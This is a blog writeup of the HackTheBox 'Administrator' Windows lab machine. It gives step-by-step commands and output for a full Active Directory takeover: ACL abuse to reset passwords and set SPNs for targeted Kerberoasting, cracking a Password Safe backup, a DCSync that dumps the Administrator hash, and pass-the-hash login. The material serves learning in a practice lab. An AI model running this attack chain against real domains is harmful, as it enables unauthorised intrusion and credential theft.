---
layout: single
title:  "HTB Administrator Writeup"
seo_title: "Writeup for the HackTheBox Administrator Machine"
date:   2025-04-19 21:01:00 +0200
categories: ['HackTheBox', 'Windows', 'Active-Directory']
classes: wide
toc: true
header:
    teaser: "/assets/images/headers/Administrator.png"
---
Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the `michael` account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user `olivia` has `GenericAll` permissions over `michael`, allowing us to reset his password. With access as `michael`, it is revealed that he can force a password change on the user `benjamin`, whose password is reset. This grants access to `FTP` where a `backup.psafe3` file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user `emily`. Further enumeration shows that `emily` has `GenericWrite` permissions over the user `ethan`, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for `ethan`, who is found to have `DCSync` rights ultimately allowing retrieval of the `Administrator` account hash and full domain compromise.

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: 
```
Username: Olivia 
Password: ichliebedich
```

# Reconnaissance
From our initial nmap scan, we see that we are dealing with a Windows Domain Controller. Notice that port 21 (FTP) is also open.

```console
$ nmap -sCV -v -oN admin.nmap 10.10.11.42
Nmap scan report for 10.10.11.42
Host is up (0.014s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-16 04:41:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-16T04:41:08
|_  start_date: N/A
|_clock-skew: 7h00m02s
```

We are given a domain user account with the following credentials: `olivia:ichliebedich`. Further enumeration reveals that this account has the PSRemoting privilege set.

```console
$ nxc smb 10.10.11.42 -u 'olivia' -p 'ichliebedich'
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich
$ nxc winrm 10.10.11.42 -u 'olivia' -p 'ichliebedich'
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
```

We can either logon to the DC with Evil-WinRM and run SharpHound to collect information for BloodHound or run the BloodHound.py script.

```console
$ bloodhound-python -u 'olivia' -p 'ichliebedich' -ns 10.10.11.42 -d administrator.htb --zip -c All
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 04S
INFO: Compressing output into 20241117135611_bloodhound.zip
```

We now start BloodHound CE and import the zip file. After looking through the data, we see that we have a path from `olivia` to `benjamin`. Now `benjamin` is a member of the Share Moderators group, so we might get more access after comprimising his account.

![](/assets/images/writeups/administrator/BH-path.png)

# User
As our starting account, we have the `GenericAll` permissions to the user `michael`. There are several ways we can abuse this privilege: we can either change the user's password or set an SPN on the account and perform a targeted Kerberoasting attack. Let's go for the latter as for the next user we already have to force a password change.

```console
$ bloodyAD --host 10.10.11.42 -d administrator.htb -u 'olivia' -p 'ichliebedich' set object michael servicePrincipalName -v 'fake/dc.administrator.htb'
[+] michael's servicePrincipalName has been updated
$ GetUserSPNs.py -dc-ip 10.10.11.42 'administrator.htb/olivia:ichliebedich' -request-user michael

ServicePrincipalName       Name     MemberOf                                                       PasswordLastSet             LastLogon  Delegation 
-------------------------  -------  -------------------------------------------------------------  --------------------------  ---------  ----------
fake/dc.administrator.htb  michael  CN=Remote Management Users,CN=Builtin,DC=administrator,DC=htb  2024-10-06 03:33:37.049043  <never>               


[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

If you get a `Clock skew too great` error just like me, just run this command that spawns a bash shell with the clock synced to the DC:
```console
$ faketime "$(ntpdate -q administrator.htb | cut -d ' ' -f 1,2)" bash
```

So now we can get the hash, copy it to a file and run hashcat to crack it.

```console
$ GetUserSPNs.py -dc-ip 10.10.11.42 'administrator.htb/olivia:ichliebedich' -request-user michael
$ hashcat -m 13100 michael.hash $ROCkYOU
```

However, we are not able to crack the hash so let's proceed with the second method and reset the password for the user account. I will also immediately reset the account for Benjamin and check what access we have. From Linux we can use the `net rpc` command.

```console
$ net rpc password "michael" "newP@ssword2022" -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.10.11.42"
$ net rpc password "benjamin" "newP@ssword2022" -U "administrator.htb"/"michael"%"newP@ssword2022" -S "10.10.11.42"
$ nxc smb 10.10.11.42 -u 'benjamin' -p 'newP@ssword2022' --shares

SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

Looks like we don't have any additional permissions on the SMB shares, so let's try the FTP share we found earlier.

```console
$ ftp 10.10.11.42 
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:bashee): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

Bingo! We are logged in on the FTP share and find a `psafe3` backup file.

```console
ftp> dir
229 Entering Extended Passive Mode (|||57646|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||57650|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************|   952       60.39 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (60.08 KiB/s)
```

The backup file protected by a password, but we can decrypt it using `JohnTheRipper`.

```console
$ pwsafe2john.py Backup.psafe3 > pwsafe.hash
$ john pwsafe.hash --wordlist=$ROCKYOU

Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
tekieromucho     (Backu)
```

With the password of the database, we can now use `pwsafe3` and see what is stored inside.

![](/assets/images/writeups/administrator/pwsafe.png)

We find the password for three users.

![](/assets/images/writeups/administrator/pwsafe-emily.png)

We can now log into the DC as Emily and grab the user flag.

```console
$ evil-winrm -i administrator.htb -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"
*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
```

# Root
Emily also has `GenericWrite` access to `Ethan`. We can therefore perform the same attacks as before and perform a targeted Kerberoast attack. 

![](/assets/images/writeups/administrator/BH-DCSync.png)

From the BloodHound data we see that `ethan` has the `DS-Replication-Get-Changes` and the `DS-Replication-Get-Changes-All` permission on the domain `ADMINISTRATOR.HTB`. We can perform a DCSync attack after compromsing his account. Let's proceed!

```console
$ bloodyAD --host 10.10.11.42 -d administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object ethan servicePrincipalName -v 'fake2/dc.administrator.htb'
$ GetUserSPNs.py -dc-ip 10.10.11.42 'administrator.htb/olivia:ichliebedich' -request-user ethan
$ hashcat -m 13100 ethan.hash $ROCKYOU
<HASH>:limpbizkit

$ secretsdump.py 'administrator.htb/ethan:limpbizkit'@10.10.11.42 -just-dc-user administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
[*] Cleaning up...
```

We have sucessfully compromised the domain and can now grab the root flag.

```console
$ evil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/17/2024  11:49 AM             34 root.txt

$ nxc winrm 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e' -x 'type Desktop\\root.txt'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] Executed command (shell type: cmd)
WINRM       10.10.11.42     5985   DC               <REDACTED>
```